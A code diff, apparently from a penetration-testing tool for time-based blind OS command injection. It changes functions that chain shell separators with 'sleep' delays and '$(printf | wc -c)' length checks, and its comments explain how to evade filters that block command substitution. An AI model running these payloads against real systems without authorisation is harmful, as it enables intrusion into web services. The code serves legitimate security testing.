@@ -36,7 +36,7 @@ way: '${#var}' counts characters where this counts bytes, and a length that disa
 indexing would have the retrieval ask for characters that are not where it was told they are.
 """
 def _length_expr(word):
-  return "$(printf '%s' \"" + word + "\" | wc -c)"
+  return settings.CMD_SUB_PREFIX + "printf '%s' \"" + word + "\" | wc -c" + settings.CMD_SUB_SUFFIX
 
 """
 The same count, handed to 'awk' as an argument instead of carried in a variable. A separator that
@@ -183,14 +183,15 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       # length did, and spares the payload a PowerShell launch whose own start-up time is noise a
       # timing measurement cannot afford.
       payload = checks.windows_probe(chain, "echo " + TAG, "==", TAG, timesec)
-  elif settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&"):
+  elif settings.SKIP_SUBST and separator in (";", "\n", "\r\n", "&", "|"):
     """
     Nothing computed at all: the delay itself is the only thing being measured, so nothing here
     needs '$(...)' or a backtick to survive a filter that blocks both outright. This gives up the
     length check the payload otherwise builds in - "did it wait this long" is cruder than "did it
     wait exactly as long as this output's length says it should" - but it is the only oracle left
-    once neither substitution syntax gets through, and both of these separators run what follows
-    them regardless of what came before, so the delay is unconditional here either way.
+    once neither substitution syntax gets through, and each of these separators runs what follows
+    it regardless of what came before - a pipe runs both of its sides - so the delay is
+    unconditional here either way.
     """
     payload = separator + "sleep " + str(timesec)
   else:
@@ -236,7 +237,11 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  )
 
 
-    elif separator in ("|", "||") and checks.substitution_nests():
+    elif separator in ("|", "||"):
+      # The marker is written out literally here, so the one substitution this counts it in holds
+      # nothing but a pipe - and a substitution that cannot hold another one holds that perfectly
+      # well. Where the count is taken of a command's own output instead, it does nest, and the
+      # branches that ask for it that way are written only where the substitution in use allows it.
       pipe = "|"
       payload = (pipe +
                  "[ " + str(output_length) + " -ne " + _length_expr(TAG) + " ]" + "||" +
